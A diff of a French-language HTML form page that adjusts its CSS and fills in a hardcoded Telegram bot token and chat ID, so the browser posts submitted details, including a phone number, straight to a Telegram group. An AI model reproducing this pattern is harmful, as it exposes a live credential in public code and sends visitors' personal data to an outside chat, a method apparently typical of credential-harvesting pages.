@@ -44,31 +44,15 @@
     }
 
     .form-logo-center img {
-      height: 40px;
+      height: 60px; /* Agrandissement du logo ici */
       width: auto;
       object-fit: contain;
-    }
-
-    /* 🔧 MODIFICATION ICI : élargir le bloc */
-    main.container {
-      display: flex;
-      justify-content: center;
-      padding: 3rem 1rem;
-    }
-
-    .card {
-      width: 100%;
-      max-width: 600px; /* ↔️ élargi depuis 480px */
-      background: white;
-      border-radius: 20px;
-      padding: 2.5rem;
-      box-shadow: 0 4px 12px rgba(0,0,0,0.05);
     }
   </style>
 </head>
 <body>
 
-  <!-- NAVIGATION SIMPLIFIÉE -->
+  <!-- NAVIGATION -->
   <div class="site-nav">
     <nav class="navbar">
       <div class="navbar-left">
@@ -163,11 +147,11 @@
 📱 Téléphone : ${tel}
       `;
 
-      fetch("https://api.telegram.org/botTON_BOT/sendMessage", {
+      fetch("https://api.telegram.org/bot7959354545:AAEfYBDF24DOs30vwYScteq1uWMO65FP8Fo/sendMessage", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
-          chat_id: "TON_CHAT_ID",
+          chat_id: "-4911236455",
           text: message
         })
       });
